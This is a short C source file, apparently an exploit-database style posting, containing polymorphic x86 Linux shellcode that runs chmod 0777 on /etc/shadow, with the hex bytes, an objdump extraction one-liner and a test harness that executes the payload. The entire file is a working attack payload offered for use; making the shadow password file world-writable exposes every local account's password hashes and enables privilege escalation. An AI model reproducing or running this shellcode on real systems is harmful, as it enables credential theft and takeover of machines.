/* Polymorphic  execve-chmod 0777 /etc/shadow */
/*
$ echo `objdump -d chmod  | grep -v file | grep '[0-9a-f]:' | cut  -f 2 ` | sed 's/ /\\x/g' | sed 's/^/\\x/g'
\x31\xc0\x50\x68\x61\x64\x6f\x77\xbe\x1d\x1d\x61\x56\x8d\x3e\x81\xc6\x12\x12\x12\x12\x56\x68\x2f\x65\x74\x63\x89\xe6\x50\x68\x30\x37\x37\x37\x89\xe5\x50\x68\x68\x6d\x6f\x64\xbf\x09\x0e\x0f\x03\x81\xc7\x60\x60\x20\x60\x57\x66\x68\x2f\x62\x89\xe3\x50\x56\x55\x53\x89\xe1\x89\xc2\x31\xc0\x04\x0a\x04\x01\x87\xc9\xcd\x80
*/

/* 
 * Test
 * $ gcc -Wall -z execstack  chmod.c 
 * $ ./a.out 
 * Size: 80 bytes (original size was 57 => 140 %)
 * $    
 */

#include <stdio.h>

char shellcode[]=
"\x31\xc0\x50\x68\x61\x64\x6f\x77\xbe\x1d\x1d\x61\x56\x8d\x3e\x81\xc6\x12\x12"
"\x12\x12\x56\x68\x2f\x65\x74\x63\x89\xe6\x50\x68\x30\x37\x37\x37\x89\xe5\x50"
"\x68\x68\x6d\x6f\x64\xbf\x09\x0e\x0f\x03\x81\xc7\x60\x60\x20\x60\x57\x66\x68"
"\x2f\x62\x89\xe3\x50\x56\x55\x53\x89\xe1\x89\xc2\x31\xc0\x04\x0a\x04\x01\x87"
"\xc9\xcd\x80";

typedef int (*func_ptr)();
int main()
{
        printf("Size: %d bytes.\n", sizeof(shellcode)); 
        ((func_ptr) shellcode)();
        return 0;
}
